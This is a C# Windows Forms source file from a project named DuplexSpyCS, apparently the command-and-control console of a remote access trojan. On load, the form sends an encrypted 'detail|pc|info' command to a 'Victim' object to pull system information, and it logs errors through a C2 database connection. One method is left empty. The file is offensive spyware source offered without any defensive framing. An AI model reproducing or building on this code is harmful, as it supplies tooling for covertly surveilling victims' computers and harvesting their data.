using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmInfo : Form
    {
        public Victim v;
        private Dictionary<string, string> dic_Screen = new Dictionary<string, string>();

        public frmInfo()
        {
            InitializeComponent();
        }

        private ColumnHeader FindColumnHeaderByText(ListView lv, string text)
        {
            ColumnHeader header = null;
            Invoke(new Action(() =>
            {
                foreach (ColumnHeader h in lv.Columns)
                {
                    if (string.Equals(h.Text, text))
                    {
                        header = h;
                        break;
                    }
                }
            }));

            return header;
        }

        public void ShowInfo(ClientConfig config)
        {
            try
            {
                
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                C2.sql_conn.WriteSysErrorLogs(ex.Message);
            }
        }

        void setup()
        {
            v.encSend(2, 0, "detail|pc|info");
        }

        private void frmInfo_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            string screen = comboBox1.Text;
            if (dic_Screen.ContainsKey(screen))
            {
                textBox5.Text = dic_Screen[screen];
            }
        }
    }
}
